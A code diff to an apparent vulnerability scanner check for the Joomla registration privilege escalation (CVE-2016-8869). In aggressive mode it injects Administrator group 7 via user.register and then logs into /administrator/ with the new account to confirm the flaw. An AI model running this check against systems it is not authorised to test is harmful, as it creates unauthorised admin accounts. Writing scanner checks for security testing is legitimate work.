@@ -4,7 +4,7 @@ from typing import Any
 
 from ...core.versions import parse_version_required, parse_version_safe
 from .advisory import passive_core_finding
-from .registration_probe import submit_registration
+from .registration_probe import submit_registration, verify_admin_login
 
 CVE_ID = "CVE-2016-8869"
 NAME = "Joomla registration privilege escalation"
@@ -43,8 +43,8 @@ def check(
     if exploit_mode != "aggressive":
         finding.detail += " Privileged account creation is mutating and is available only in aggressive mode."
         return finding
-    super_user_group = 8
-    proof = submit_registration(target_url, group=super_user_group, timeout=timeout, proxy=proxy)
+    elevated_group = 7
+    proof = submit_registration(target_url, group=elevated_group, timeout=timeout, proxy=proxy)
     finding.exploit_ran = proof["sent"]
     finding.proof_url = proof["proof_url"]
     if not proof["sent"]:
@@ -52,28 +52,46 @@ def check(
         finding.confidence = "LOW"
         finding.detail = proof["reason"]
     elif proof.get("account_created"):
-        finding.status = "LIKELY_VULNERABLE"
-        finding.confidence = "HIGH"
-        finding.detail = (
-            "The corrected registration.register request delivered top-level groups[]=8 and persisted a user, "
-            "confirmed by a same-session username/e-mail collision. Group-8 assignment is not externally observable, "
-            "so Super User privileges are not claimed as confirmed. "
-            f"Disposable candidate: {proof['username']} / {proof['password']} ({proof['email']}); an administrator "
-            "must inspect and remove it."
+        login = verify_admin_login(
+            target_url,
+            username=proof["username"],
+            password=proof["password"],
+            timeout=timeout,
+            proxy=proxy,
         )
         finding.evidence = {
             "account_created": True,
-            "group_requested": super_user_group,
+            "group_requested": elevated_group,
             "group_field": proof.get("group_field"),
-            "privilege_confirmed": False,
+            "privilege_confirmed": bool(login.get("logged_in")),
+            "admin_login_status": login.get("status"),
             "collision_markers": proof.get("collision_markers", []),
         }
+        if login.get("logged_in"):
+            finding.status = "VULNERABLE"
+            finding.confidence = "CONFIRMED"
+            finding.detail = (
+                "The legacy user.register task created an account in the Administrator group (group 7) and the "
+                "new account logged into /administrator/. This confirms unauthenticated privilege escalation. "
+                f"Disposable candidate: {proof['username']} / {proof['password']} ({proof['email']}); remove it "
+                "and review the user group map."
+            )
+        else:
+            finding.status = "LIKELY_VULNERABLE"
+            finding.confidence = "HIGH"
+            finding.detail = (
+                "The legacy user.register task persisted a user with the injected Administrator group (group 7), "
+                "confirmed by a same-session username/e-mail collision. The account could not log into "
+                "/administrator/ (activation may be pending or login was rejected). "
+                f"Disposable candidate: {proof['username']} / {proof['password']} ({proof['email']}); an "
+                "administrator must inspect and remove it."
+            )
     elif proof.get("sent"):
         finding.status = "AGGRESSIVE_SENT"
         finding.confidence = "LOW"
         finding.detail = (
-            "The corrected registration.register request with top-level groups[]=8 was sent, but the collision "
-            "oracle did not confirm persistence. "
+            "The legacy user.register request with user[groups][]=7 was sent, but the collision oracle did not "
+            "confirm persistence. "
             f"Disposable candidate: {proof['username']} / {proof['password']} ({proof['email']}); collision markers: "
             f"{proof.get('collision_markers', [])}."
         )
